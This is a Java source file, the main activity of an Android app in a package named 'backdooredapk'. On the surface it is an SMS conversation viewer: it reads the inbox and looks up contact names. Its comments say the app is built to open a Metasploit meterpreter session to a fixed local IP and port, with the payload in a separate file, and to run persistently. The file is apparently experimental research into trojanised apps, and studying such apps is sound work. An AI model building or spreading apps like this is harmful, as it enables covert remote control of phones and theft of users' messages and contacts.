package stage.metasploit.com.backdooredapk;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.os.Bundle;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.app.Activity;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    // This application is designed to open a meterpreter session to the following ip-port
    // LHOST = 192.168.178.30:4444 to modify this, open Payload.java
    // This application runs forever ( "android:persistent=true" ). This SHOULD NOT BE TRUE for any application, except system apps.
    // Has been set to true for experimental purposes, check AndroidManifest if you want to disable this

        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);
            RecyclerView rvConversation = (RecyclerView) findViewById(R.id.rv_conversations);
            rvConversation.setHasFixedSize(true);
            LinearLayoutManager llm = new LinearLayoutManager(this);
            rvConversation.setLayoutManager(llm);
            rvConversation.setAdapter(new SMSListAdapter(getConversations(), this));
            /*Intent mis = new Intent(this, MyIntentService.class);
            this.startService(mis);*/
        }

    private List<Conversation> getConversations() {
        Uri SMS_INBOX = Uri.parse("content://sms/conversations/");
        Cursor c = getContentResolver().query(SMS_INBOX, null, null, null, "date DESC");

        startManagingCursor(c);
        String[] snippet = new String[c.getCount()];
        String[] thread_id = new String[c.getCount()];
        String[] number = new String[c.getCount()];
        String[] name = new String[c.getCount()];
        c.moveToFirst();

        for (int i = 0; i < c.getCount(); i++) {
            thread_id[i] = c.getString(c.getColumnIndexOrThrow("thread_id"));
            snippet[i] = c.getString(c.getColumnIndexOrThrow("snippet"));
            //Toast.makeText(getApplicationContext(), count[i] + " - " + thread_id[i]+" - "+snippet[i] , Toast.LENGTH_LONG).show();
            c.moveToNext();
        }
        //c.close();
        for(int ad = 0; ad < thread_id.length ; ad++)
        {
            Uri uri = Uri.parse("content://sms");
            String where = "thread_id=="+thread_id[ad];
            Cursor mycursor= getContentResolver().query(uri, null, where ,null,null);

            if(mycursor != null) {
                if (mycursor.moveToFirst()) {
                    number[ad] = mycursor.getString(mycursor.getColumnIndexOrThrow("address"));
                }

                mycursor.close();
            }
        }

        for(int i = 0; i < number.length; i ++)
        {

            String result = number[i];
            String a = number[i].substring(0,1);



            if(!a.equals("+")) {
                result = number[i];
            }


            ContentResolver localContentResolver = getApplicationContext().getContentResolver();
            Cursor contactLookupCursor =
                    localContentResolver.query(
                            Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                                    Uri.encode(number[i])),
                            new String[] {ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.PhoneLookup._ID},
                            null,
                            null,
                            null);
            try {
                if (contactLookupCursor != null)
                    while(contactLookupCursor.moveToNext()){
                        result = contactLookupCursor.getString(contactLookupCursor.getColumnIndexOrThrow(ContactsContract.PhoneLookup.DISPLAY_NAME));
                    }
            }catch (Exception e) {
                result = number[i];

            }
            finally {
                name[i] = result;
                if (contactLookupCursor != null)
                contactLookupCursor.close();
            }
        }

        ArrayList<Conversation> convs = new ArrayList<>();
        for(int i = 0 ; i < number.length ; i++) {
            convs.add(new Conversation(name[i], snippet[i]));
        }
        return convs;
    }

}







